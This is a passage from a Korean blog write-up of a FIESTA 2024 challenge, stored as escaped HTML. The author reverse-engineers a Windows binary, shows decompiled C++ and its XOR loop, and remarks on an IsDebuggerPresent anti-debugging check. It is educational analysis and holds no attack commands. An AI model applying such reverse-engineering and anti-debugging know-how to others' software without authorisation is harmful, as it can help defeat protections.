  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ostream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ios_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ios_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_Ios_base_dtor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ios_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifstream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_403300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;istream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ios_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ios_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_Ios_base_dtor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ios_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 함수 내부를 보면 좀 많이 어려워 보인다.&lt;/p&gt;

&lt;p&gt;굳이 전체를 이해할 필요 없이 핵심 동작을 수행하는 곳이 어딘지부터 알아내 보자고&lt;/p&gt;

&lt;p&gt;원래 논문도 핵심부터 읽는 거고&lt;/p&gt;

&lt;p&gt;코드도 핵심부터 거꾸로 읽는 거지&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;먼저 해당 프로그램이 있던 깃허브 레포를 보면, XOR을 수행하는 프로그램이라 되어 있다.&lt;/p&gt;

&lt;p&gt;그렇다면, 난독화가 안 걸려 있거나 좀 정직하게 쓰인 프로그램이라면 높은 확률로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;^&lt;/code&gt; 기호가 등장하는 곳이 주요 행위를 수행하는 부분이 될 것이다.&lt;/p&gt;

&lt;p&gt;암호화에 주로 사용되는 연산을 난독화하는 기법에 대해선 다음 포스팅에 다뤄보는 것도 좋겠다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2036.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아 대박 진짜 있네&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFu&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Block_1_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 부분이 핵심인가보다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 생각하는 게 맞는지 ChatGPT에게 물어봤다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2037.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;맞다고 함&lt;/p&gt;

&lt;p&gt;그럼 이 안에서 사용되는 주요 변수가 무엇일지 알아내 보자.&lt;/p&gt;

&lt;p&gt;? 평문으로 들어가는 데이터가 없는 것 같음.&lt;/p&gt;

&lt;p&gt;그럼 뭐…. bp걸고 동적으로 분석해야지…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2038.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernalbase.dll&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernalbase32.dll&lt;/code&gt; 에서  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsDebuggerPresent&lt;/code&gt;를 Import하긴 하는데&lt;/p&gt;

&lt;p&gt;왜인진 몰라도 안티디버깅이 안 터짐 ㅋㅋㅋㅋㅋ아뭐지&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

